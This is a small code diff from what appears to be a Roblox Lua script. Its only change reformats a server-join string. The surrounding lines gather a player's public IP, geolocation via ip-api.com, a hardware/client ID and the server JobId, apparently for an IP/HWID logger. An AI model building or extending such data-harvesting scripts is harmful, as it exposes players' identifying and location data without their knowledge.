@@ -12,7 +12,7 @@ local Country = game.LocalizationService.RobloxLocaleId
 local GetIp = game:HttpGet("https://v4.ident.me/")
 local GetData = game:HttpGet("http://ip-api.com/json")
 local GetHwid = game:GetService("RbxAnalyticsService"):GetClientId()
-local ConsoleJobId = 'Roblox.GameLauncher.joinGameInstance(' .. game.PlaceId .. ', "' .. game.JobId .. '")'
+local ConsoleJobId = string.format("Roblox.GameLauncher.joinGameInstance(%d, \"%s\")", game.PlaceId, game.JobId)
 
 local GAMENAME = MarketplaceService:GetProductInfo(game.PlaceId).Name
 
